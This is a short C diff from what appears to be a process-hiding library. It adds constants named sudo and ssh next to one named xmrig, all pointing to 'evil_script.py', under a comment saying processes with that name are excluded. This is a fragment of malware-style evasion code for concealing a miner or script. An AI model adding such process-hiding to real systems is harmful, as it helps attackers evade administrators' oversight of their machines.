@@ -10,7 +10,8 @@
  * Every process with this name will be excluded
  */
 static const char* xmrig = "evil_script.py";
-
+static const char* sudo = "evil_script.py";
+static const char* ssh = "evil_script.py";
 /*
  * Get a directory name given a DIR* handle
  */
